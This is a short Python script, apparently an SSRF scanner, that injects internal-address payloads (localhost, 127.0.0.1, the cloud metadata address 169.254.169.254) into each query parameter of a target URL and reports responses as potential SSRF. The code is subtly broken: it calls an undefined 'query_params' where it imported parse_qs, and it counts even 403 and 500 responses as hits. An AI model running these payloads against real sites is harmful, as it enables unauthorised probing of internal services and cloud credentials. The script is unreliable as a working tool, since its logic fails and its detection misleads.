import requests
from urllib.parse import urlparse,urlencode,parse_qs,urlunparse

SSRF_PAYLOADS= ["https://127.0.0.1","https://localhost:80","http://169.254.169.254","http://internal.example.com"]

def test_url(base_url, method="GET", headers=None, data=None):
    print("\n[***] Starting SSRF Scan ...")
    
    try:
        parsed_url = urlparse(base_url)
        query_params = query_params(parsed_url.query)

        if not query_params:
            print("[-] No query parameters to test")
            return
        for param in query_params:
            print(f"[+] Testing parameter : {param}")

            for payload in SSRF_PAYLOADS:
                modified_params = query_params.copy()
                modified_params[param] = payload
                
                new_query = urlencode(modified_params,doseq=True)
                new_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, new_query, parsed_url.fragment))

                print(f"[*]Trying payload : {payload}")
                if method == "GET":
                    response = requests.get(new_url, headers=headers)
                else:
                    response = requests.request(method, new_url, headers=headers, data=data)
                if response.status_code in [200, 301, 302, 403, 500]:
                    print(f"[!] Potential SSRF with {param}={payload} --> Status: {response.status_code}")



    except Exception as e:
        print(f"[!] SSRF Scan failed : {e}")
        